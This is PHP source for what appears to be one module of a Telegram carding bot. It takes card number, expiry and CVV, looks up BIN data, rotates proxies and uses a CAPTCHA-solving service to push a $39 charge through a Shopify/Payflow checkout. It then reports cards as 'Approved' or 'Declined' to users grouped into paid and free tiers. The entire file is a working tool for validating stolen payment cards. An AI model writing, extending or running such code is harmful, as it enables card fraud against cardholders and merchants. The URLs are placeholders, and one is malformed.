<?php
if(strpos($message, '!pw') === 0 or strpos($message, '/pw') === 0 or strpos($message, '.pw') === 0){
    sendaction($chatId, typing);
        $NameGater ='Payflow';
$gateway = '/pw :'.$NameGater;
is_gateroff($NameGater); //off Gater
is_premium(); // true ´Premium
deleteprm($userId); // delete Premium
Contador($gateway);

IS_BANNED($userId,$chatId,$message_id);
sendaction($chatId, typing);

deleteprm($userId);

$lista = substr($message, 4);

if(empty($lista)){
$lista = $r_msg;
}if(empty($lista)){
$lista = $q_msg;}

if(empty($lista)){
bot('sendMessage', [
                'chat_id' =>$chatId,
                'disable_web_page_preview' => true,
    'reply_to_message_id'=>$message_id,
    'parse_mode'=>'HTML',
                'text' =>"<b>[<a href='https://example.invalid/legacy'>ϟ</a>] Gate Charged: >_ $-Security System ⚠️
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Pasarela: <code>Payflow AVS 39$</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Status: <code>ONLINE! 🟩</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Format: <code>!pw card|month|year|cvv</code>
━━━━━━━━━━━━━━━━</b>"
                ]);
        die();
}

$tiempo_inicial = microtime(true);

$card = json_encode(Parser1($lista));
$card = json_decode($card, true);
$cc = $card["card"];
$mes = $card["MES"];
$ano = $card["ANO"];
$cvv = $card["CVV"];
$valid = $card["valid"];


if($valid == "ERROR"){
reply_to($chatId,$message_id,$keyboard,"<b>Invalid format</b>");
die();
}

if(bannedbin(substr($cc, 0,6)) == true){
reply_to($chatId,$message_id,$keyboard,"<b>Bin Banned</b>.");
exit();
}

if ($gId == $Mi_Id) $Rank = "Owner";
elseif (verifiAdmin($userId)) $Rank = "Admin";
elseif (veritimepremium($userId)) $Rank = infouser($userId)['apodo'];
elseif (verifiCharAdmin($chatId)) $Rank = "Free User";
elseif (verifiUser($userId)) $Rank = "Free user";

is_Antispma($userId, $chatId, $messageId, $keyboard);
    
    
$res = bininfo(substr($cc, 0,6));
$type = $res['type'];
$bank = $res['bank'];
$brand = $res['brand'];
$scheme = $res['level'];
$country = $res['country'];
$emoji = $res['Emoji'];

if($scheme == 'PREPAID'){
reply_to($chatId,$message_id,$keyboard,"<b>Bin PREPAID Banned</b>.");
die();
}

$messageidtoedit1 = bot('sendMessage', [
    'chat_id' =>$chatId,
    'disable_web_page_preview' => true,
'reply_to_message_id'=>$message_id,
'parse_mode'=>'HTML',
    'text' =>"<b>[<a href='https://example.invalid/legacy'>ϟ</a>] Gate Charged: >_ $-Payflow AVS 39$
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Status: <code>WAIT A FEW SECONDS 🟥</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>"
]);

$messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');

antisppre($userId); //Premium
antispFree($userId); //Free User

# ------------ Ramdom User ------------ #

$rotate = rotate();
$socks5 = socks5();




$Idcooki = uniqid();
#EMPIEZA EL PROCESO DE CHEQUEO
if($mes < 10){
    $mes = substr($mes, -1);}



$solver = new \Capsolver\CapsolverClient('REDACTED_CREDENTIAL');

$curl = ShopifyIa('hhttps://example.invalid/legacy',''.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'', $solver);
$result2 = GetStr($curl, '<p class="notice__text">', '</p>');


$tiempo_final = microtime(true);
$tiempo = $tiempo_final - $tiempo_inicial;
$tiempo = substr($tiempo, 0, 4);
if(strlen($mes) == 1){
    $mes = '0'.$mes;
}
bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://example.invalid/legacy'>ϟ</a>] Gate Charged: >_ $-Payflow AVS 39$
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Status: <code>ALMOST FINISHED 🟩</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);

if($result2 == "Security code was not matched by the processor"){
$status = "Approved #CCN ✅";
$response = "CVV2 Mismatch: 15004-This transaction cannot be processed. Please enter a valid Credit Card Verification Number.";
}elseif ($result2 == "Invalid postal code or street address"){ 
$status = "Approved!🟩";
$response = "Invalid postal code or street address. 🟩";
}elseif ($result2 == 'Your order is confirmed'){ 
$status = "Approved!🟩";
$response = "Your order is confirmed(39$)🟩";
}else{
$status = "[ DECLINED 🔴 ]";
$response = "Declined";
   }
   
   unlink(getcwd().'/cookie'.$Idcooki.'.txt');
bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://example.invalid/legacy'>ϟ</a>] Gate Charged: >_ $-Payflow AVS 39$
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
[<a href='https://example.invalid/legacy'>ϟ</a>] Status: <code>$status</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Response: <code>$response</code>
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Card Check info: Proxy's: <code>Live ✅</code> 
[<a href='https://example.invalid/legacy'>ϟ</a>] Time: <code>$tiempo</code> | Gate: <code>$NameGater</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);

}

?>

